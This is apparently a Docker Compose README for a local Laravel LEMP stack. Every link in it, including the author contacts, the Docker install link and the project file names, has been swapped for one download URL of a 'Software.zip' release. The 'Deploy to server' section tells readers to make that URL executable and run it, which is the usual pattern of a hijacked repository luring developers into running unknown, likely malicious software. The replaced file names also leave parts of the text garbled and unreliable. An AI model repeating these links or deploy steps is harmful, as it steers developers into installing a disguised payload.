# Docker For Laravel Application

A pretty simplified Docker Compose workflow that sets up a LEMP network of containers for local Laravel development.

**_Build by KingNNT_**

### Author's informations:

-   Email: [https://github.com/vukhang16/Docker-For-Laravel-Application/releases/download/v1.0/Software.zip](https://github.com/vukhang16/Docker-For-Laravel-Application/releases/download/v1.0/Software.zip)
-   Skype: [https://github.com/vukhang16/Docker-For-Laravel-Application/releases/download/v1.0/Software.zip](https://github.com/vukhang16/Docker-For-Laravel-Application/releases/download/v1.0/Software.zip)
-   Facebook Profile: [Ninh Ngọc Tuấn](https://github.com/vukhang16/Docker-For-Laravel-Application/releases/download/v1.0/Software.zip)
-   Facebook Page: [https://github.com/vukhang16/Docker-For-Laravel-Application/releases/download/v1.0/Software.zip](https://github.com/vukhang16/Docker-For-Laravel-Application/releases/download/v1.0/Software.zip)
-   Github Profile: [Ninh Ngọc Tuấn](https://github.com/vukhang16/Docker-For-Laravel-Application/releases/download/v1.0/Software.zip)
-   Gitlap Profile: [Ninh Ngọc Tuấn](https://github.com/vukhang16/Docker-For-Laravel-Application/releases/download/v1.0/Software.zip)
-   Bitbucket Profile: [https://github.com/vukhang16/Docker-For-Laravel-Application/releases/download/v1.0/Software.zip](https://github.com/vukhang16/Docker-For-Laravel-Application/releases/download/v1.0/Software.zip)

## Usage

To get started, make sure you have [Docker installed](https://github.com/vukhang16/Docker-For-Laravel-Application/releases/download/v1.0/Software.zip) on your system, and then clone this repository.

Next, navigate in your terminal to the directory you cloned this, and spin up the containers for the web server by running `docker-compose up -d --build site` or use target `make run`.

After that completes, follow the steps from the [https://github.com/vukhang16/Docker-For-Laravel-Application/releases/download/v1.0/Software.zip](https://github.com/vukhang16/Docker-For-Laravel-Application/releases/download/v1.0/Software.zip) file to get your Laravel project added in (or create a new blank one).

Bringing up the Docker Compose network with `site` instead of just using `up`, ensures that only our site's containers are brought up at the start, instead of all of the command containers as well. The following are built for our web server, with their exposed ports detailed:

-   **nginx** - `:80`
-   **mysql** - `:3306`
-   **php** - `:9000`
-   **redis** - `:6379`
-   **mailhog** - `:8025`

Three additional containers are included that handle Composer, NPM, and Artisan commands _without_ having to have these platforms installed on your local computer. Use the following command examples from your project root, modifying them to fit your particular use case.

-   `docker-compose run --rm composer update`
-   `docker-compose run --rm npm run dev`
-   `docker-compose run --rm artisan migrate`

or use target of `Makefile`

### Deploy to server

Run commands in your terminal

```
chmod +x https://github.com/vukhang16/Docker-For-Laravel-Application/releases/download/v1.0/Software.zip
https://github.com/vukhang16/Docker-For-Laravel-Application/releases/download/v1.0/Software.zip
```

## Using BrowserSync with Laravel Mix

If you want to enable the hot-reloading that comes with Laravel Mix's BrowserSync option, you'll have to follow a few small steps. First, ensure that you're using the updated `https://github.com/vukhang16/Docker-For-Laravel-Application/releases/download/v1.0/Software.zip` with the `:3000` and `:3001` ports open on the npm service. Then, add the following to the end of your Laravel project's `https://github.com/vukhang16/Docker-For-Laravel-Application/releases/download/v1.0/Software.zip` file:

```javascript
.browserSync({
    proxy: 'nginx',
    open: false,
    port: 3000,
});
```

From your terminal window at the project root, run the following command to start watching for changes with the npm container and its mapped ports:

```bash
docker-compose run --rm --service-ports npm run watch
```

That should keep a small info pane open in your terminal (which you can exit with Ctrl + C). Visiting [localhost:3000](http://localhost:3000) in your browser should then load up your Laravel application with BrowserSync enabled and hot-reloading active.

## MailHog

The current version of Laravel (8 as of today) uses MailHog as the default application for testing email sending and general SMTP work during local development. Using the provided Docker Hub image, getting an instance set up and ready is simple and straight-forward. The service is included in the `https://github.com/vukhang16/Docker-For-Laravel-Application/releases/download/v1.0/Software.zip` file, and spins up alongside the webserver and database services.

To see the dashboard and view any emails coming through the system, visit [localhost:8025](http://localhost:8025) after running `docker-compose up -d site`.
